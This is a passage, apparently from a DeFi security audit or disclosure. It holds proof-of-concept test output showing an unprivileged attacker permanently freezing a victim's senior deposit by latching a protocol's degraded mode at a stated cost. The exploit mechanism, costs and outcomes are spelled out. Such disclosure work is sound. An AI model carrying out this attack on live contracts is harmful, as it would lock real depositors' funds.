  sizePerSide                : 1199000000000000000000000
  pool.totalAssets (cash)    : 1142558334936
  maxLiability (open long)   : 1199000000000
  availCash < maxLiability ? : true
  degradedMode               : true
  attacker net cost to FULLY unwind the hedge (assets): 1975869872
[PASS] test_B_attackerFreezesTargetedSeniorDeposit()
  victim principal FROZEN (assets): 100000000000
  degradedMode                    : true
  cancel reverts committed + settle reverts DegradedMode => no exit
[PASS] test_C_renounceMakesFreezePermanent()
  clearDegradedMode BEFORE renounce -> reverts CfdEngine__StillInsolvent (owner stuck)
  owner after renounce       : 0x0000000000000000000000000000000000000000
  degradedMode (permanent)   : true
  clearDegradedMode AFTER renounce -> OwnableUnauthorizedAccount for every caller
```

What the output proves:
- An unprivileged two-account hedged close latches `degradedMode` on a solvent pool (cash 1,142,558 USDG < maxLiability 1,199,000 USDG). There is no operator action. Net cost is 1,975.87 USDG, and the latch stays set (test A).
- The latch strands a targeted 100,000 USDG senior deposit. It is neither settleable (reverts `HousePool__DegradedMode`) nor cancellable (reverts `TrancheVault__SeniorDepositCommitted`). The embedded same-mark control settles the identical deposit, which isolates the attacker's close as the cause (test B).
- Before renounce the owner cannot clear the latch (`CfdEngine__StillInsolvent`). After the owner's routine `renounceOwnership()` the latch is uncallable by every caller forever, so the freeze is permanent (test C).
